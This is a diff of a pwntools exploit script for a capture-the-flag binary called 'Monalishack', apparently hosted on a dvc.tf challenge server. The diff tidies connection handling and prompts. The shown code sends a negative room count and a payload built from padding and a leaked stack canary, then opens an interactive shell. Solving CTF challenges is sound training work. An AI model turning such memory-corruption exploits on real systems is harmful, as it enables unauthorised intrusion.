@@ -13,10 +13,7 @@ vuln_path = "./Monalishack"
 elf = ELF(vuln_path)
 
 def get_io():
-    if f_gdb:
-        io = process(vuln_path, stdin=PTY, stdout=PTY) if not f_remote else remote("a78ff51eded4ce7be39eac9aa1094ff2.chall.dvc.tf", 443, ssl=True)
-    else:
-        io = process(vuln_path) if not f_remote else remote("a78ff51eded4ce7be39eac9aa1094ff2.chall.dvc.tf", 443, ssl=True)
+    io = process(vuln_path) if not f_remote else remote("a78ff51eded4ce7be39eac9aa1094ff2.chall.dvc.tf", 443, ssl=True)
     return io
 
 
@@ -34,7 +31,7 @@ def pwn(io):
     # ddebug(d)
     io.sendlineafter("Enter your name :", payload)
     
-    io.sendlineafter("choice", "3")
+    io.sendlineafter("Enter your choice : ", "3")
     io.sendlineafter("How many rooms do you want to visit? ( 0-99 )", "1")
     io.sendlineafter("choice", "1")
     
@@ -50,6 +47,7 @@ def pwn(io):
     io.sendlineafter("choice", "3")
     io.sendlineafter("How many rooms do you want to visit? ( 0-99 )", "-1")
     
+    # io.sendafter("Who are the tickets for?", b"tinyfat")
     payload = b""
     payload += b"t"*10
     payload += p64(canary)
@@ -60,17 +58,6 @@ def pwn(io):
     io.recv(timeout=1)
     sleep(1) 
     io.interactive()
-if f_gdb:
 
-    io = get_io()
-    pwn(io)
-else:
-    for i in range(20):
-        io = get_io()
-        log.success(f"------{i}-------")
-        try:
-            pwn(io)
-        except:
-            pass
-        finally:
-            io.close()
+io = get_io()
+pwn(io)
